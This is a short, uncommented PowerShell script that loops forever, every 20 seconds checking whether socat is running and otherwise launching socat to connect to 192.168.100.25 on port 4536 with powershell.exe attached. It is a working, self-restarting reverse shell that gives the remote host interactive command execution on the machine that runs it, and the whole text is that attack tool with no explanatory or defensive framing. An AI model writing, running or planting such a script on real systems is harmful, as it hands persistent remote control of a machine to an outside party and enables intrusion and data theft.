$multilineScript = @' 

if(Get-Process -Name socat.exe | ForEach-Object { Get-NetTCPConnection -OwningProcess $_.Id -ErrorAction SilentlyContinue } ){
	Write-Host "socat running"
}else{
Write-Host "socat not running"
	powershell.exe .\socat -d -d TCP4:192.168.100.25:4536 EXEC:'powershell.exe',pipes
	
}
'@
$scriptBlock = [scriptblock]::Create($multilineScript)
while($true){

Invoke-Command -ScriptBlock $scriptBlock
Start-Sleep -Seconds 20
continue

}


